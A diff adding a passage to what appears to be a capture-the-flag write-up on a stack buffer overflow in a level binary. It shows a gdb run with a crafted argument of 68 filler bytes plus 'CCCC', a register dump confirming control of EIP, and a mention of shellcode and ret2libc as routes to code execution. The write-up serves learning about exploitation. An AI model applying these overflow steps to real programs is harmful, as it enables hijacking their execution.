@@ -154,6 +154,31 @@ String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
 Segmentation fault
 ```
 
+With gdb it is possible to see that the EIP register can be controlled from 69th byte to 72nd byte                                                                                                    
+
+```bash
+Starting program: /levels/level3 `python -c 'print "\x41" * 68 + "CCCC"'` `python -c 'print "\x42" * 128'`
+(gdb)
+0x43434343 in ?? ()
+(gdb) info registers
+eax            0x0  0
+ecx            0x7ffffee0   2147483360
+edx            0xf7fcd870   -134424464
+ebx            0x0  0
+esp            0xffffdbc0   0xffffdbc0
+ebp            0x41414141   0x41414141
+esi            0xf7fcc000   -134430720
+edi            0xf7fcc000   -134430720
+eip            0x43434343   0x43434343 <---------
+eflags         0x286    [ PF SF IF ]
+cs             0x23 35
+ss             0x2b 43
+ds             0x2b 43
+es             0x2b 43
+fs             0x0  0
+gs             0x63 99
+```
+
 Several methods can make it possible to execute arbitrary code, in particular by using a global variable in which there is a shellcode and the address is known beforehand. Although, I prefered to play a bit more with the basic gdb commands on the server to get more familiar w/ the basics and `ret2libc`.
 
 ```bash
